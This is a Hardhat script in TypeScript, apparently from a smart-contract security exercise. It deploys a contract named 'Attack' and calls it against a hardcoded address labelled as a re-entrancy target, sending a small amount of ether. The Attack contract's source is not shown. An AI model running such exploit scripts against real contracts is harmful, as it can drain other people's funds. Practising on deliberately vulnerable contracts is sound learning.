// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

async function main() {

  const RE_ENTRANCY_CONTRACT_ADDRESS = "0xCF9B0cBC4ACd672cd0a84c3d078Bbac4AaE7d86f"

  // We get the contract to deploy
  const Attack = await ethers.getContractFactory("Attack");
  const attack = await Attack.deploy();

  await attack.deployed();

  console.log("Attack deployed to:", attack.address);

  const attackTx = await attack.attack(RE_ENTRANCY_CONTRACT_ADDRESS, {
    value: parseEther("0.001"),
    gasLimit: 500000
  })
  attackTx.wait(4)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
